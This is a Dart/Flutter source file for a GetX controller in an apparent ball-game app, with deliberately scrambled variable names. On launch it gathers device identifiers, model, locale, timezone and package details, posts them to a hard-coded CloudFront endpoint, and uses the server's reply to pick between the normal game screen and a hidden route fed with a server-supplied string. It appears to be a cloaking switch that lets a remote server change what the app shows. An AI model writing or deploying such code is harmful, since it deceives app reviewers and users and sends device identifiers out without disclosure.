import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class BallChargeLogic extends GetxController {

  var hdcnoyfw = RxBool(false);
  var ejygtnac = RxBool(true);
  var mvdq = RxString("");
  var xtyibcs = RxBool(false);
  var usfb = RxBool(true);
  final hfeuidz = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    tyhmg();
  }


  Future<void> tyhmg() async {
    xtyibcs.value = true;
    usfb.value = true;
    ejygtnac.value = false;

    hfeuidz.post("https://d8h5dsaw0xi2j.cloudfront.net/YvTuYT7MUeXpTYb",data: await cdstkwbni()).then((value) {
      var zvtpcsq = value.data["zvtpcsq"] as String;
      var obvrkn = value.data["obvrkn"] as bool;
      if (obvrkn) {
        mvdq.value = zvtpcsq;
        bxmzvs();
      } else {
        teymzcq();
      }
    }).catchError((e) {
      ejygtnac.value = true;
      usfb.value = true;
      xtyibcs.value = false;
    });
  }

  Future<Map<String, dynamic>> cdstkwbni() async {
    final DeviceInfoPlugin sjce = DeviceInfoPlugin();
    PackageInfo grum_qalenv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var gvhjm = Platform.localeName;
    var cqaOkVM = currentTimeZone;

    var adVGFwJ = grum_qalenv.packageName;
    var YLjHUte = grum_qalenv.version;
    var FKgm = grum_qalenv.buildNumber;

    var gdlI = grum_qalenv.appName;
    var WAbDBGzt = "";
    var PHCwb  = "";
    var NGemPE = "";
    var ntpgkhoy = "";
    var fgobiyhx = "";
    var ofblns = "";
    var wyhjgcmv = "";


    var vYGmXI = "";
    var BOrwkUGW = false;

    if (GetPlatform.isAndroid) {
      vYGmXI = "android";
      var rtqdjaulwn = await sjce.androidInfo;

      NGemPE = rtqdjaulwn.brand;

      WAbDBGzt  = rtqdjaulwn.model;
      PHCwb = rtqdjaulwn.id;

      BOrwkUGW = rtqdjaulwn.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      vYGmXI = "ios";
      var mgzerko = await sjce.iosInfo;
      NGemPE = mgzerko.name;
      WAbDBGzt = mgzerko.model;

      PHCwb = mgzerko.identifierForVendor ?? "";
      BOrwkUGW  = mgzerko.isPhysicalDevice;
    }
    var res = {
      "fgobiyhx" : fgobiyhx,
      "FKgm": FKgm,
      "gvhjm": gvhjm,
      "YLjHUte": YLjHUte,
      "adVGFwJ": adVGFwJ,
      "WAbDBGzt": WAbDBGzt,
      "gdlI": gdlI,
      "cqaOkVM": cqaOkVM,
      "NGemPE": NGemPE,
      "PHCwb": PHCwb,
      "vYGmXI": vYGmXI,
      "BOrwkUGW": BOrwkUGW,
      "ntpgkhoy" : ntpgkhoy,
      "ofblns" : ofblns,
      "wyhjgcmv" : wyhjgcmv,

    };
    return res;
  }

  Future<void> teymzcq() async {
    Get.offNamed("/ballMain");
  }

  Future<void> bxmzvs() async {
    Get.offNamed("/addBallSec");
  }

}
